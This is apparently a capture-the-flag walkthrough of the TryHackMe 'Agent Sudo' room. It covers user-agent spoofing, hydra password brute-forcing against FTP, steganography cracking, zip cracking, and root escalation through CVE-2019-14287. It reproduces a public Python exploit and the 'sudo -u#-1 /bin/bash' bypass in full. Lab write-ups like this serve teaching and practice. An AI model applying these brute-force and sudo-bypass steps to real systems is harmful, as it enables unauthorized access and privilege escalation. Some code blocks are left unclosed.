Browsing to the URL shows us we need to change our user-agent to access the site. Using THM's hint we know that it needs to be "C". If you are clever, you could probably deduce that information based on the use of "Agent R".<br><br>

![web](./docs/agentsudo/agent_01_web.png)

Usinb *Burp*, we change the user-agent to "C" and send the request again:<br><br>

![useragent](./docs/agentsudo/agent_02_useragent.png)

![newagent](./docs/agentsudo/agent_03_newuser.png)

Now we have a username. From here, we use *hydra* to figure out the FTP password:<br><br>

```
hydra -l chris -P /usr/share/wordlists/rockyou.txt -vV agent ftp -I

Using the discovered password, we login to the FTP server and find 3 files:<br><br>

```

Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

First, we use *stegseek* to take a crack at "cute-alien.jpg":<br><br>

```
stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt
 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Area51"           
[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".

cat cute-alien.jpg.out

Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

Now we have some more credentials (probably for SSH). We try *stegseek* on "cutie.png", but it does not support PNG files, so we try *binwalk* and discover a ZIP file embedded:<br><br>

```
binwalk -e cutie.png

```

At first, "To_agentR.txt" is empty. So, we take a crack at the ZIP file (pun intended):<br><br>

```
zip2john 8702.zip > zip.hash

ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type

Now we can unzip the file (using *7z* instead of *unzip* because it was throwing an error) and read "To_agentR.txt":<br><br>

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

**NOTE:** You can use something like CyberChef to figure out that the string is "Area51", but *stegseek* did that for us, so we kind of skipped ahead.

After logging in via SSH with *james*, we see 2 files: "Alien_autospy.jpg" and "user_flag". Please note that autopsy is misspelled as autospy, so this might cause some confusion when you try to copy the file to your machine with *scp*.<br><br>

**user_flag.txt**:

```

For the next challenge question, we upload the image to TinEye and find the answer:

## Privilege escalation
<br>

Now it is time to elevate our privileges. Checking the *sudo* privilegs of *james* reveals that we can execute */bin/bash* as any user. Checking the *sudo* version indicates the system is vulnerable to CVE-2019-14287:<br><br>

```
sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
    
james@agent-sudo:~$ sudo -V

Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2

**CVE-2019-14287**<br><br>

```py
# Exploit Title : sudo 1.8.27 - Security Bypass
# Date : 2019-10-15
# Original Author: Joe Vennix
# Exploit Author : Mohin Paramasivam (Shad0wQu35t)
# Version : Sudo <1.8.28
# Tested on Linux
# Credit : Joe Vennix from Apple Information Security found and analyzed the bug
# Fix : The bug is fixed in sudo 1.8.28
# CVE : 2019-14287

'''Check for the user sudo permissions

sudo -l 

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash


So user hacker can't run /bin/bash as root (!root)


User hacker sudo privilege in /etc/sudoers

# User privilege specification
root    ALL=(ALL:ALL) ALL

hacker ALL=(ALL,!root) /bin/bash


With ALL specified, user hacker can run the binary /bin/bash as any user

EXPLOIT: 

sudo -u#-1 /bin/bash

Example : 

hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@kali:/home/hacker#

Description :
Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id

and /bin/bash is executed with root permission
Proof of Concept Code :

How to use :
python3 sudo_exploit.py

'''


#!/usr/bin/python3

import os

#Get current username

username = input("Enter current username :")


#check which binary the user can run with sudo

os.system("sudo -l > priv")


os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")

binary_file = open("binary")

binary= binary_file.read()

#execute sudo exploit

print("Lets hope it works")

os.system("sudo -u#-1 "+ binary)
```

After elevating our privileges, we find *root.txt*:<br><br>
